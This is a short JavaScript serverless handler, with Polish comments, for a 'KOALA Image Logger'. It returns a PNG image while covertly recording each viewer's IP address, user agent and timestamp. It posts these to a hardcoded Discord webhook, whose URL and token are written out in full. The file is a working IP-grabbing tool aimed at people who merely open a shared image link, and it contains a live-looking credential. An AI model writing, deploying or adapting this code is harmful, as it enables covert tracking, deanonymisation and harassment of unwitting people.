// ====================== KOALA IMAGE LOGGER ======================
// Działa jak hotdog-img.vercel.app – zwraca obrazek i loguje IP

const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";

// Stabilny obrazek (z Discorda) – zawsze działa
const IMAGE_URL = "https://cdn.discordapp.com/attachments/1054650838129332255/1153307620187312168/convert.png";

export default async function handler(req, res) {
    // 1. Pobierz IP
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString();

    // 2. Przygotuj wiadomość (możesz dodać geolokalizację później)
    const message = `[+] KOALA Image Logger - IP Logged\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}`;

    // 3. Wyślij webhook (asynchronicznie, nie czekaj)
    fetch(YOUR_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
    }).catch(err => console.error('Webhook error:', err));

    // 4. Pobierz obrazek z CDN
    let imageBuffer;
    try {
        const imgRes = await fetch(IMAGE_URL);
        imageBuffer = await imgRes.arrayBuffer();
    } catch (err) {
        // Awaryjnie – przezroczysty 1x1 PNG (Discord też to wyświetli)
        const fallback = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        imageBuffer = fallback;
    }

    // 5. Zwróć obrazek
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(Buffer.from(imageBuffer));
}
